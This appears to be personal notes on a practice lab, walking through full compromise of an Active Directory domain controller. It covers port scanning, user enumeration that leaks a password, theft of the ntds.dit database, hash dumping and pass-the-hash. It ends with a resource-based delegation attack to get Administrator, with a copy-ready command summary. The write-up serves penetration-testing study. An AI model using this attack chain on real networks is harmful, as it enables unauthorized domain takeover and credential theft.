53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-07 06:01:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-07T06:02:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Issuer: commonName=ResourceDC.resourced.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T05:58:36
| Not valid after:  2027-02-05T05:58:36
| MD5:   ac0a:ceb1:60ac:2449:5bc5:ef3a:a77b:6f76
|_SHA-1: d5a9:2935:b6e5:611f:d0bd:4296:4d09:b747:094d:e53b
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-07T06:01:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  unknown
49708/tcp open  msrpc         Microsoft Windows RPC

nmap scriptvuln
Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
 since cannot negotioate
 sudo ntpdate $ip
 

enum4linux
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                                
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, **reminder: HotelCalifornia194!**

**reminder: HotelCalifornia194!** i mised this. omygosh. V.Ventz password?
smbclient \\\\$ip\\"Password Audit" -U V.Ventz
i retrieved ntds.dit
<img width="456" height="78" alt="image" src="https://github.com/user-attachments/assets/9fbc5c01-2917-48c3-b76b-90b6a43cb83b" />
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
<img width="1040" height="716" alt="image" src="https://github.com/user-attachments/assets/f9721099-f9cf-4f06-956b-8c0568b91419" />

last delimitter is the ntlm hash
<img width="456" height="281" alt="image" src="https://github.com/user-attachments/assets/6ce4da69-c622-4bc0-bf99-b47da4c7eb86" />
crackmapexec winrm $ip -u users -H hashes
WINRM       192.168.230.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)

<img width="1071" height="221" alt="image" src="https://github.com/user-attachments/assets/e442742e-c753-4038-aad5-2e42ac3beccd" />

bloodhound shows that l.livingstone has genericall on resourcedc

add attacker computer
<img width="1421" height="101" alt="image" src="https://github.com/user-attachments/assets/eb629ad7-6a04-40f1-b613-bb50b7e0624a" />
rbcd
<img width="1224" height="237" alt="image" src="https://github.com/user-attachments/assets/f301a717-ba95-4cd0-9bcb-7ed6a92b8923" />
get kerberoast ticket impersonating administrator
<img width="1165" height="190" alt="image" src="https://github.com/user-attachments/assets/8c319188-73cd-4e65-92d1-1ea8818803c2" />

add resourcedc.resourced.local to /etc/hosts. and export krb55cname to the ticket name
<img width="805" height="112" alt="image" src="https://github.com/user-attachments/assets/7462cfa8-7efc-4390-aec6-5f5847ec78fe" />

sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip $ip
<img width="786" height="547" alt="image" src="https://github.com/user-attachments/assets/cae89f84-a4c0-46b7-ab05-592ab4fe599e" />
that was so hard.
**summary**
impacket-addcomputer resourced.local/l.livingstone -dc-ip $ip -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACKER$' -computer-pass 'Attacker123'

sudo python3 ~/tools/rbcd.py -dc-ip $ip -t RESOURCEDC -f 'ATTACKER' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced.local\\L.Livingstone

impacket-getST -spn cifs/resourcedc.resourced.local resourced.local/ATTACKER$:'Attacker123' -impersonate Administrator -dc-ip $ip

export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
add resourcedc.resourced.local to /etc/hosts

sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip $ip

